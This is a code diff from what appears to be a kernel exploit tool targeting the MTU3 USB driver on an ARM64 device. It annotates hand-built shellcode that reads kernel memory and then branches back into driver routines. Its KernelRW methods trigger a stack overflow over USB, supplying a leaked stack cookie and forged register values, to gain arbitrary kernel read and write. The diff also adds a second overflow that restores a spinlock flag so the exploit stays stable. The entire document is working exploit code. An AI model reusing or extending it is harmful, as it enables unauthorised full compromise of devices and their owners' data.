@@ -51,48 +51,60 @@ static bool build_direct_context_helper(uint8_t out[constants::DIRECT_CONTEXT_SC
 static bool build_direct_read_helper(uint8_t out[constants::DIRECT_READ_SC_SIZE]) {
     std::memset(out, 0, constants::DIRECT_READ_SC_SIZE);
     uint32_t branch;
-    const uint32_t setup[] = {0xF9400260, 0x91004000};
+    const uint32_t setup[] = {
+        0xF9400260,  // ldr x0, [x19]
+        0x91004000   // add x0, x0, #0x10
+    };
 
     // Byte entry
-    store_le32(out + 0, setup[0]);
-    store_le32(out + 4, setup[1]);
-    store_le32(out + 8, 0x394003A1);
-    store_le32(out + 12, 0x39000001);
+    store_le32(out + 0, setup[0]);      // ldr x0, [x19]
+    store_le32(out + 4, setup[1]);      // add x0, x0, #0x10
+    store_le32(out + 8, 0x394003A1);   // ldrb w1, [x29]
+    store_le32(out + 12, 0x39000001);  // strb w1, [x0]
     if (!arm64_branch(constants::DIRECT_READ_BYTE_SC + 16, constants::MTU3_COMPLETE_RESUME, false, &branch)) return false;
-    store_le32(out + 16, branch);
+    store_le32(out + 16, branch);       // b MTU3_COMPLETE_RESUME
 
     // QWord entry
-    store_le32(out + 20, setup[0]);
-    store_le32(out + 24, setup[1]);
-    store_le32(out + 28, 0xF94003A1);
-    store_le32(out + 32, 0xF9000001);
+    store_le32(out + 20, setup[0]);     // ldr x0, [x19]
+    store_le32(out + 24, setup[1]);     // add x0, x0, #0x10
+    store_le32(out + 28, 0xF94003A1);  // ldr x1, [x29]
+    store_le32(out + 32, 0xF9000001);  // str x1, [x0]
     if (!arm64_branch(constants::DIRECT_READ_QWORD_SC + 16, constants::MTU3_COMPLETE_RESUME, false, &branch)) return false;
-    store_le32(out + 36, branch);
+    store_le32(out + 36, branch);       // b MTU3_COMPLETE_RESUME
 
-    // Block entry
-    store_le32(out + 40, setup[0]);
-    store_le32(out + 44, setup[1]);
-    const uint32_t block[] = {0xA9400BA1, 0xA9000801, 0xA9410BA1, 0xA9010801, 0xA9420BA1, 0xA9020801, 0xA9430BA1, 0xA9030801};
+    // Block entry (reads 64 bytes via 4 pairs of registers)
+    store_le32(out + 40, setup[0]);     // ldr x0, [x19]
+    store_le32(out + 44, setup[1]);     // add x0, x0, #0x10
+    const uint32_t block[] = {
+        0xA9400BA1,  // ldp x1, x2, [x29]
+        0xA9000801,  // stp x1, x2, [x0]
+        0xA9410BA1,  // ldp x1, x2, [x29, #0x10]
+        0xA9010801,  // stp x1, x2, [x0, #0x10]
+        0xA9420BA1,  // ldp x1, x2, [x29, #0x20]
+        0xA9020801,  // stp x1, x2, [x0, #0x20]
+        0xA9430BA1,  // ldp x1, x2, [x29, #0x30]
+        0xA9030801   // stp x1, x2, [x0, #0x30]
+    };
     for (size_t i = 0; i < 8; i++) store_le32(out + 48 + i * 4, block[i]);
     if (!arm64_branch(constants::DIRECT_READ_BLOCK_SC + 40, constants::MTU3_COMPLETE_RESUME, false, &branch)) return false;
-    store_le32(out + 80, branch);
+    store_le32(out + 80, branch);       // b MTU3_COMPLETE_RESUME
     return true;
 }
 
 static bool build_cold_cleanup_helper(uint64_t address, uint8_t out[constants::COLD_CLEANUP_SIZE]) {
     std::memset(out, 0, constants::COLD_CLEANUP_SIZE);
     uint32_t branch;
-    store_le32(out + 0, 0xF9400E60);
-    store_le32(out + 4, 0xB9402261);
+    store_le32(out + 0, 0xF9400E60);   // ldr x0, [x19, #0x18]
+    store_le32(out + 4, 0xB9402261);   // ldr w1, [x19, #0x20]
     if (!arm64_branch(address + 8, constants::PATCH_TEXT, true, &branch)) return false;
-    store_le32(out + 8, branch);
-    store_le32(out + 12, 0xF9403EB4);
-    store_le32(out + 16, 0xAA1503E0);
+    store_le32(out + 8, branch);       // bl PATCH_TEXT
+    store_le32(out + 12, 0xF9403EB4);  // ldr x20, [x21, #0x78]  ; x20 = mep (ep0)
+    store_le32(out + 16, 0xAA1503E0);  // mov x0, x21            ; x0 = &mtu->lock
     if (!arm64_branch(address + 20, constants::RAW_SPIN_LOCK_ADDR, true, &branch)) return false;
-    store_le32(out + 20, branch);
-    store_le32(out + 24, 0x39033696);
+    store_le32(out + 20, branch);      // bl RAW_SPIN_LOCK_ADDR
+    store_le32(out + 24, 0x3903369F);  // strb wzr, [x20, #0xcd] ; mep->busy = 0
     if (!arm64_branch(address + 28, constants::MTU3_EP0_ISR_EPILOGUE, false, &branch)) return false;
-    store_le32(out + 28, branch);
+    store_le32(out + 28, branch);      // b MTU3_EP0_ISR_EPILOGUE
     return true;
 }
 
@@ -206,6 +218,9 @@ static bool find_request_buffer(const std::vector<uint8_t>& disclosure, uint64_t
 bool KernelRW::setup_read() {
     if (request_buffer != 0) return true;
 
+    // Disassembly at constants::CLEAN_RETURN (0xFFFFFFC000305778):
+    // 0xFD, 0x7B, 0xC1, 0xA8 -> ldp x29, x30, [sp], #0x10
+    // 0xC0, 0x03, 0x5F, 0xD6 -> ret
     static const uint8_t clean_epilogue[] = {0xfd, 0x7b, 0xc1, 0xa8, 0xc0, 0x03, 0x5f, 0xd6};
 
     std::vector<uint8_t> disclosure = usb->hid_get(0xF2, 0x00, 0x1000);
@@ -450,7 +465,24 @@ bool KernelRW::write_byte(uint64_t addr, uint8_t val) {
     pack_q(buf, cached_registers.x21);     // X21
     pack_q(buf, val);                      // X22
 
-    return !_trigger_overflow(buf).empty();
+    if (_trigger_overflow(buf).empty()) return false;
+
+    // Restore proper value for spinlock bit (mep->busy = 0)
+    if (cached_registers.mep != 0 && addr != cached_registers.mep + 0xCD) {
+        std::vector<uint8_t> restore_buf = {0xF0, 0x01};
+        restore_buf.insert(restore_buf.end(), 62, 0x00);
+        pack_q(restore_buf, constants::STACK_COOKIE);
+        pack_q(restore_buf, 0);                        // X29
+        pack_q(restore_buf, constants::CLEAN_RETURN);  // X30
+        pack_q(restore_buf, 0);                        // X19
+        pack_q(restore_buf, cached_registers.mep);     // X20 (writes to [mep, #0xCD])
+        pack_q(restore_buf, cached_registers.x21);     // X21
+        pack_q(restore_buf, 0);                        // X22 (proper value: 0)
+
+        return !_trigger_overflow(restore_buf).empty();
+    }
+
+    return true;
 }
 
 bool KernelRW::write_u64_slow(uint64_t addr, uint64_t val) {
@@ -469,7 +501,7 @@ bool KernelRW::write_u64_fast(uint64_t addr, uint64_t val) {
     pack_q(buf, val);                     // X19
     pack_q(buf, addr);                    // X20
     pack_q(buf, cached_registers.x21);    // X21
-    pack_q(buf, 0xFF);                    // X22
+    pack_q(buf, 0);                       // X22 (proper value: 0 for mep->busy)
 
     return !_trigger_overflow(buf).empty();
 }
